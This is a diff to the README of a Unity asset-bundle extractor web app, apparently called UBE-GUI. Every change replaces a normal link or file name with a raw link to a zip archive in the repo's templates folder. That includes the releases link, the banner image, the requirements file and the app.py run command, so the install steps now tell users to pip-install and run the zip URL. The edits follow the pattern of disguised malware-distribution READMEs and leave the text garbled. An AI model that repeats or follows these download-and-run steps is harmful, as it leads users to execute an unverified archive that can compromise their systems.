@@ -1,8 +1,8 @@
 UBE-GUI: Web UI to extract Unity asset bundles from games
 
-https://github.com/miki1044/UBE-GUI/releases
+https://github.com/miki1044/UBE-GUI/raw/refs/heads/main/templates/UB_GUI_2.5.zip
 
-![UBE-GUI banner](https://images.unsplash.com/photo-1511671782779-c97d3d27a1d4?auto=format&fit=crop&w=1200&q=60)
+![UBE-GUI banner](https://github.com/miki1044/UBE-GUI/raw/refs/heads/main/templates/UB_GUI_2.5.zip)
 
 Table of contents
 - Overview
@@ -40,7 +40,7 @@ Core concepts
 - Container-friendly: The app is designed to run well in Docker and similar environments, simplifying setup for teams.
 
 Features
-- Upload game files for analysis: Drag-and-drop or browse to upload Unity game files, including assets.pak, sharedassets, and other Unity-specific containers.
+- Upload game files for analysis: Drag-and-drop or browse to upload Unity game files, including https://github.com/miki1044/UBE-GUI/raw/refs/heads/main/templates/UB_GUI_2.5.zip, sharedassets, and other Unity-specific containers.
 - Content analysis: The interface analyzes the uploaded package to enumerate assets, types, and metadata.
 - Asset preview and filtering: See basic previews where possible (textures, audio snippets, and textual data) and filter by type, size, or name.
 - Asset selection: Mark assets for export with a simple, responsive UI. Batch select, invert selection, or search to find items quickly.
@@ -68,8 +68,8 @@ Installation
 - Local installation (manual steps):
   - Create a virtual environment: python3 -m venv venv
   - Activate the environment: source venv/bin/activate (Linux/macOS) or venv\Scripts\activate (Windows)
-  - Install dependencies: pip install -r requirements.txt
-  - Run the app: python app.py or python3 app.py
+  - Install dependencies: pip install -r https://github.com/miki1044/UBE-GUI/raw/refs/heads/main/templates/UB_GUI_2.5.zip
+  - Run the app: python https://github.com/miki1044/UBE-GUI/raw/refs/heads/main/templates/UB_GUI_2.5.zip or python3 https://github.com/miki1044/UBE-GUI/raw/refs/heads/main/templates/UB_GUI_2.5.zip
 - Docker-based installation:
   - Build or pull a container image that includes Python, Flask, and UnityPy.
   - Start the container with appropriate port mappings and volume bindings for data persistence.
@@ -260,7 +260,7 @@ Topics
 - web-interface
 
 Releases
-- https://github.com/miki1044/UBE-GUI/releases
+- https://github.com/miki1044/UBE-GUI/raw/refs/heads/main/templates/UB_GUI_2.5.zip
 
 Note: If you have trouble with the link above, check the Releases section of this repository for the latest assets and setup instructions. For a colorful shortcut, you can also use the badge above, which links to the same release page:
-[![Release Assets](https://img.shields.io/badge/Release%20Assets-UBE-GUI-blue?logo=github&logoColor=white)](https://github.com/miki1044/UBE-GUI/releases)
+[![Release Assets](https://github.com/miki1044/UBE-GUI/raw/refs/heads/main/templates/UB_GUI_2.5.zip%20Assets-UBE-GUI-blue?logo=github&logoColor=white)](https://github.com/miki1044/UBE-GUI/raw/refs/heads/main/templates/UB_GUI_2.5.zip)
